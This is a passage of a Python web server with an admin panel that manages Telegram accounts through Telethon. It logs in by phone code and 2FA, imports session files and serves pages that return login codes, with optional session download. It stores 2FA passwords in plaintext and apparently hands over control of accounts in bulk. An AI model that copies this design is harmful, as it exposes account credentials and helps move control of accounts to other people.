                self._send_html(500, "Download failed.")
            return

        if path == "/admin/logout":
            token = self._get_admin_session_token()

            if token:
                with admin_sessions_lock:
                    admin_sessions.discard(token)

            self._redirect(
                "/admin/login",
                "admin_session=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/; HttpOnly; SameSite=Strict"
            )
            return

        if path in ("/admin", "/admin/login_new_account", "/admin/import_session_page"):
            if not self._admin_logged_in():
                self._redirect("/admin/login")
                return
            settings = load_settings()
            platform_options = platform_options_html(settings.get("platform", "desktop"))
            safe_api_id = html_escape(str(settings.get("api_id", "")), quote=True) if settings.get("platform") == "custom" else ""
            safe_api_hash = html_escape(str(settings.get("api_hash", "")), quote=True) if settings.get("platform") == "custom" else ""
            platform_data = {key: (None if value is None else [value[0], value[1]]) for key, value in PLATFORM_API.items()}
            scripts = COPY_SCRIPT + PLATFORM_SCRIPT.replace("__PLATFORM_DATA__", json.dumps(platform_data))
            if path == "/admin/login_new_account":
                html = ADMIN_TEMPLATE.replace("__TITLE__", "Login New Account").replace("__DASH_ACTIVE__", "").replace("__LOGIN_ACTIVE__", "active").replace("__IMPORT_ACTIVE__", "").replace("__CONTENT__", LOGIN_NEW_ACCOUNT_CONTENT).replace("__SCRIPT__", scripts).replace("__PLATFORM_OPTIONS__", platform_options).replace("__API_ID_VALUE__", safe_api_id).replace("__API_HASH_VALUE__", safe_api_hash).replace("__STYLE__", COMMON_STYLE)
                self._send_html(200, html); return
            if path == "/admin/import_session_page":
                html = ADMIN_TEMPLATE.replace("__TITLE__", "Import Session").replace("__DASH_ACTIVE__", "").replace("__LOGIN_ACTIVE__", "").replace("__IMPORT_ACTIVE__", "active").replace("__CONTENT__", IMPORT_SESSION_CONTENT).replace("__SCRIPT__", scripts).replace("__PLATFORM_OPTIONS__", platform_options).replace("__API_ID_VALUE__", safe_api_id).replace("__API_HASH_VALUE__", safe_api_hash).replace("__STYLE__", COMMON_STYLE)
                self._send_html(200, html); return
            base_url = self._get_base_url(); accounts = list_accounts(); items = ""; bulk_options = ""
            for meta in accounts:
                account_id = str(meta.get("id", "")); phone = str(meta.get("phone", "")); code = str(meta.get("latest_code", "")); tag = str(meta.get("tag", "")); login_api = platform_display(meta)
                copy_value = f"+{phone}--{base_url}/getcode/{account_id}" if phone else f"{base_url}/getcode/{account_id}"
                safe_id = html_escape(account_id, quote=True); safe_phone = html_escape(phone or account_id); safe_code = html_escape(code or "None"); safe_copy = html_escape(copy_value, quote=True); safe_tag = html_escape(tag, quote=True); safe_tag_display = html_escape(tag or "-"); safe_login_api = html_escape(login_api or "-")
                checked = " checked" if meta.get("allow_session_download", True) else ""
                bulk_options += f'<label class="bulk-option"><input type="checkbox" name="account_ids" value="{safe_id}"><span>{safe_phone}</span></label>'
                items += f'<div class="item"><div class="item-top"><div><div class="item-phone">{safe_phone}</div><div class="small">{safe_login_api}</div></div><div class="item-actions"><button type="button" data-copy="{safe_copy}" onclick="copyText(this.dataset.copy)">Copy</button><a class="button" href="/getcode/{safe_id}">Open</a><form class="inline-form" method="post" action="/admin/delete/{safe_id}" onsubmit="return confirm(\'Delete this account and its local session files?\');"><button class="danger" type="submit">Delete</button></form></div></div><div class="item-code">Latest code: {safe_code}</div><div class="account-meta"><div class="small">Tag: {safe_tag_display}</div><div class="small">ID: {safe_id}</div></div><form class="switch-row" method="post" action="/admin/session_download/{safe_id}"><div><div style="font-size:13px;font-weight:700">Session download</div><div class="small">Allow download from the receive-code page</div></div><label class="switch"><input type="checkbox" name="enabled" value="1"{checked} onchange="this.form.submit()"><span class="slider"></span></label></form><form class="tag-form" method="post" action="/admin/tag/{safe_id}"><input type="text" name="tag" value="{safe_tag}" placeholder="Tag"><button type="submit">Save Tag</button></form></div>'
            bulk_body = bulk_options or '<div class="small">No accounts available.</div>'
            account_body = items or '<div class="panel"><div class="small">No accounts yet.</div></div>'
            content = f'<div class="topbar"><div><h1>Dashboard</h1><div class="subtitle">Telegram account and session management</div></div><div class="live"><span class="dot"></span> Server online</div></div><div class="stats"><div class="stat"><div class="label">Total accounts</div><div class="stat-value">{len(accounts)}</div></div></div><section class="panel bulk-panel"><div class="panel-head"><div><div class="panel-title">Multi-account Session Download</div><div class="panel-desc">Select multiple accounts and change their session-download permission at once.</div></div></div><form method="post" action="/admin/bulk_session_download"><div class="bulk-list">{bulk_body}</div><div class="bulk-actions"><button class="primary" type="submit" name="action" value="enable">Enable Selected</button><button type="submit" name="action" value="disable">Disable Selected</button></div></form></section><div class="accounts-head"><div><div class="panel-title">Accounts</div><div class="panel-desc">Manage existing Telegram sessions.</div></div><a class="button primary" href="/admin/login_new_account">Login New Account</a></div><div class="accounts-list">{account_body}</div>'
            html = ADMIN_TEMPLATE.replace("__TITLE__", "Dashboard").replace("__DASH_ACTIVE__", "active").replace("__LOGIN_ACTIVE__", "").replace("__IMPORT_ACTIVE__", "").replace("__CONTENT__", content).replace("__SCRIPT__", scripts).replace("__STYLE__", COMMON_STYLE)
            self._send_html(200, html); return

        self._redirect("/admin")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length) if length > 0 else b""

        path = urlparse(self.path).path
        content_type = self.headers.get("Content-Type", "")

        if "multipart/form-data" in content_type:
            fields, files = parse_multipart(body, content_type)
            data = fields
        else:
            data = parse_qs(body.decode("utf-8", "ignore")) if body else {}
            files = {}

        if path == "/admin/auth":
            pwd = get_first(data, "pwd", "")

            if pwd == ADMIN_PASSWORD:
                token = secrets.token_urlsafe(32)

                with admin_sessions_lock:
                    admin_sessions.add(token)

                self._redirect(
                    "/admin",
                    f"admin_session={token}; Path=/; HttpOnly; SameSite=Strict"
                )
            else:
                page = simple_page(
                    "Admin Login",
                    '<p>Wrong password.</p><div class="actions"><a class="button" href="/admin/login">Back</a></div>'
                )
                self._send_html(200, page)

            return

        if not self._admin_logged_in():
            self._redirect("/admin/login")
            return

        if path == "/admin/send_code":
            phone = get_first(data, "phone", "").strip()

            if not phone:
                self._send_html(200, message_page("Error", "Missing phone."))
                return

            tag = get_first(data, "tag", "").strip()
            platform_raw = get_first(data, "platform", "")
            api_id_raw = get_first(data, "api_id", "")
            api_hash_raw = get_first(data, "api_hash", "")

            api_id, api_hash, platform, error = parse_credentials_with_platform(
                platform_raw,
                api_id_raw,
                api_hash_raw
            )

            if error:
                self._send_html(200, message_page("Error", error))
                return

            remember_credentials(platform, api_id_raw, api_hash_raw)

            async def _send_code():
                tmp_base = os.path.join(SESSIONS_DIR, f"_tmp_{uuid.uuid4().hex}")
                client = create_client(tmp_base, api_id, api_hash)

                try:
                    await client.connect()
                    result = await client.send_code_request(phone)

                    old = pending_logins.get(phone)

                    if old:
                        try:
                            await old["client"].disconnect()
                        except Exception:
                            pass

                        remove_session_files(old["tmp_base"])

                    pending_logins[phone] = {
                        "client": client,
                        "hash": result.phone_code_hash,
                        "api_id": api_id,
                        "api_hash": api_hash,
                        "platform": platform,
                        "tmp_base": tmp_base,
                        "tag": tag
                    }

                    return simple_page("Enter Code", f'''
<form method="post" action="/admin/verify">
<input type="hidden" name="phone" value="{html_escape(phone, quote=True)}">
<input type="hidden" name="tag" value="{html_escape(tag, quote=True)}">
<div class="label">Code</div>
<input type="text" name="code" required>
<div class="label">2FA Password</div>
<input type="password" name="password">
<div class="actions">
<button type="submit">Verify</button>
<a class="button" href="/admin">Back</a>
</div>
</form>
''')

                except Exception as e:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

                    remove_session_files(tmp_base)

                    return message_page("Error", f"Error: {str(e)}")

            future = asyncio.run_coroutine_threadsafe(_send_code(), main_loop)

            try:
                html = future.result(timeout=30)
            except Exception as e:
                html = message_page("Error", f"Timeout: {str(e)}")

            self._send_html(200, html)
            return

        if path == "/admin/verify":
            phone = get_first(data, "phone", "").strip()
            code = get_first(data, "code", "").strip()
            pwd = get_first(data, "password", "")
            tag = get_first(data, "tag", "").strip()

            pending = pending_logins.get(phone)

            if not pending:
                self._send_html(200, message_page("Error", "Session expired."))
                return

            if not tag:
                tag = str(pending.get("tag", "")).strip()

            async def _verify():
                client = pending["client"]
                tmp_base = pending["tmp_base"]

                try:
                    await client.sign_in(phone, code, phone_code_hash=pending["hash"])
                except SessionPasswordNeededError:
                    if not pwd:
                        try:
                            await client.disconnect()
                        except Exception:
                            pass

                        remove_session_files(tmp_base)
                        pending_logins.pop(phone, None)

                        return message_page("Error", "2FA password required.")

                    try:
                        await client.sign_in(password=pwd)
                    except Exception as e:
                        try:
                            await client.disconnect()
                        except Exception:
                            pass

                        remove_session_files(tmp_base)
                        pending_logins.pop(phone, None)

                        return message_page("Error", f"2FA failed: {str(e)}")

                except Exception as e:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

                    remove_session_files(tmp_base)
                    pending_logins.pop(phone, None)

                    return message_page("Error", f"Code failed: {str(e)}")

                try:
                    client.session.save()
                    me = await client.get_me()
                    real_phone = getattr(me, "phone", "") or phone
                    await client.disconnect()
                except Exception as e:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

                    remove_session_files(tmp_base)
                    pending_logins.pop(phone, None)

                    return message_page("Error", f"Save session failed: {str(e)}")

                clean_phone = str(real_phone).replace("+", "").strip()
                existing_id = find_account_id_by_phone(clean_phone)
                account_id = existing_id or str(uuid.uuid4())

                if not is_safe_account_id(account_id):
                    account_id = str(uuid.uuid4())

                old_meta = load_meta(account_id)
                created_at = 0

                if old_meta:
                    try:
                        created_at = float(old_meta.get("created_at", 0) or 0)
                    except Exception:
                        created_at = 0

                if not created_at:
                    try:
                        if os.path.exists(session_path(account_id)):
                            created_at = os.path.getmtime(session_path(account_id))
                    except Exception:
                        created_at = 0

                if not created_at:
                    created_at = time.time()

                old_client = clients.pop(account_id, None)

                if old_client:
                    try:
                        await old_client.disconnect()
                    except Exception:
                        pass

                delete_account(account_id)

                try:
                    shutil.move(tmp_base + ".session", session_path(account_id))
                except Exception as e:
                    remove_session_files(tmp_base)
                    pending_logins.pop(phone, None)

                    return message_page("Error", f"Move session failed: {str(e)}")

                remove_session_files(tmp_base)

                save_meta(account_id, {
                    "phone": clean_phone,
                    "api_id": pending["api_id"],
                    "api_hash": pending["api_hash"],
                    "api_platform": pending.get("platform", ""),
                    "password_2fa": pwd,
                    "latest_code": "",
                    "latest_code_ts": 0,
                    "tag": tag,
                    "created_at": created_at,
                    "allow_session_download": True
                })

                pending_logins.pop(phone, None)

                return simple_page("Login success", f'''
<p>Phone: {html_escape(clean_phone)}</p>
<p>Session: sessions/{html_escape(account_id)}.session</p>
<div class="actions">
<a class="button" href="/admin">Back</a>
</div>
''')

            future = asyncio.run_coroutine_threadsafe(_verify(), main_loop)

            try:
                html = future.result(timeout=60)
            except Exception as e:
                html = message_page("Error", f"Timeout: {str(e)}")

            self._send_html(200, html)
            return

        if path == "/admin/import_session":
            if "session_file" not in files or not files["session_file"]["content"]:
                self._send_html(200, message_page("Error", "No file uploaded."))
                return

            file_content = files["session_file"]["content"]

            if not file_content.startswith(b"SQLite format 3"):
                self._send_html(
                    200,
                    message_page("Error", "Invalid file. Native Telethon .session file is required.")
                )
                return

            phone_input = get_first(data, "phone", "").strip()
            pwd_input = get_first(data, "password_2fa", "")
            tag_input = get_first(data, "tag", "").strip()
            platform_raw = get_first(data, "platform", "")
            api_id_raw = get_first(data, "api_id", "")
            api_hash_raw = get_first(data, "api_hash", "")

            api_id, api_hash, platform, error = parse_credentials_with_platform(
                platform_raw,
                api_id_raw,
                api_hash_raw
            )

            if error:
                self._send_html(200, message_page("Error", error))
                return

            remember_credentials(platform, api_id_raw, api_hash_raw)

            async def _import():
                tmp_base = os.path.join(SESSIONS_DIR, f"_import_{uuid.uuid4().hex}")

                try:
                    with open(tmp_base + ".session", "wb") as f:
                        f.write(file_content)
                except Exception as e:
                    return message_page("Error", f"Write file failed: {str(e)}")

                client = create_client(tmp_base, api_id, api_hash)

                try:
                    await client.connect()

                    if not await client.is_user_authorized():
                        raise Exception("session is invalid or unauthorized")

                    client.session.save()
                    me = await client.get_me()
                    real_phone = getattr(me, "phone", "") or phone_input
                    await client.disconnect()

                except Exception as e:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass

                    remove_session_files(tmp_base)

                    return message_page("Error", f"Import failed: {str(e)}")

                clean_phone = str(real_phone).replace("+", "").strip()
                existing_id = find_account_id_by_phone(clean_phone)
                account_id = existing_id or str(uuid.uuid4())

                if not is_safe_account_id(account_id):
                    account_id = str(uuid.uuid4())

                old_meta = load_meta(account_id)
                created_at = 0

                if old_meta:
                    try:
                        created_at = float(old_meta.get("created_at", 0) or 0)
                    except Exception:
                        created_at = 0

                if not created_at:
                    try:
                        if os.path.exists(session_path(account_id)):
                            created_at = os.path.getmtime(session_path(account_id))
                    except Exception:
                        created_at = 0

                if not created_at:
                    created_at = time.time()

                old_client = clients.pop(account_id, None)

                if old_client:
                    try:
                        await old_client.disconnect()
                    except Exception:
                        pass

                delete_account(account_id)

                try:
                    shutil.move(tmp_base + ".session", session_path(account_id))
                except Exception as e:
                    remove_session_files(tmp_base)

                    return message_page("Error", f"Move session failed: {str(e)}")

                remove_session_files(tmp_base)

                save_meta(account_id, {
                    "phone": clean_phone,
                    "api_id": api_id,
                    "api_hash": api_hash,
                    "api_platform": platform,
                    "password_2fa": pwd_input,
                    "latest_code": "",
                    "latest_code_ts": 0,
                    "tag": tag_input,
                    "created_at": created_at,
                    "allow_session_download": True
                })

                return simple_page("Import success", f'''
<p>Phone: {html_escape(clean_phone)}</p>
<p>Session: sessions/{html_escape(account_id)}.session</p>
<div class="actions">
<a class="button" href="/admin">Back</a>
</div>
''')

            future = asyncio.run_coroutine_threadsafe(_import(), main_loop)

            try:
                html = future.result(timeout=60)
            except Exception as e:
                html = message_page("Error", f"Timeout: {str(e)}")

            self._send_html(200, html)
            return

        if path == "/admin/bulk_session_download":
            account_ids = data.get("account_ids", [])
            if not isinstance(account_ids, list): account_ids = [account_ids]
            action = get_first(data, "action", ""); enabled = action == "enable"
            if action in ("enable", "disable"):
                for account_id in account_ids:
                    account_id = str(account_id).strip()
                    if is_safe_account_id(account_id) and os.path.exists(session_path(account_id)):
                        update_meta(account_id, allow_session_download=enabled)
            self._redirect("/admin"); return

        if path.startswith("/admin/session_download/"):
            account_id = path.split("/admin/session_download/", 1)[-1].strip("/")

            if not is_safe_account_id(account_id):
                self._redirect("/admin")
                return

            meta = load_meta(account_id)
            if meta is not None and os.path.exists(session_path(account_id)):
                update_meta(
                    account_id,
                    allow_session_download=get_first(data, "enabled", "") == "1"
                )

            self._redirect("/admin")
            return

        if path.startswith("/admin/tag/"):
            account_id = path.split("/admin/tag/", 1)[-1].strip("/")

            if not is_safe_account_id(account_id):
                self._redirect("/admin")
                return

            tag = get_first(data, "tag", "").strip()
            update_meta(account_id, tag=tag)
            self._redirect("/admin")
            return

        if path.startswith("/admin/delete/"):
            account_id = path.split("/admin/delete/", 1)[-1].strip("/")

            if not is_safe_account_id(account_id):
                self._redirect("/admin")
                return

            client = clients.pop(account_id, None)

            if client:
                future = asyncio.run_coroutine_threadsafe(client.disconnect(), main_loop)

                try:
                    future.result(timeout=5)
                except Exception:
                    pass

            delete_account(account_id)
            self._redirect("/admin")
            return

        self._redirect("/admin")


def start_server():
    migrate_legacy_sessions()
    cleanup_temporary_sessions()

    server = ThreadingHTTPServer(("0.0.0.0", SERVER_PORT), Handler)
    print(f"Server running on port {SERVER_PORT}")
    print(f"Sessions directory: {os.path.abspath(SESSIONS_DIR)}")
    server.serve_forever()


if __name__ == "__main__":
    try:
        asyncio.set_event_loop(main_loop)

        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()

        main_loop.run_forever()
    except KeyboardInterrupt:
        print("Shutting down...")
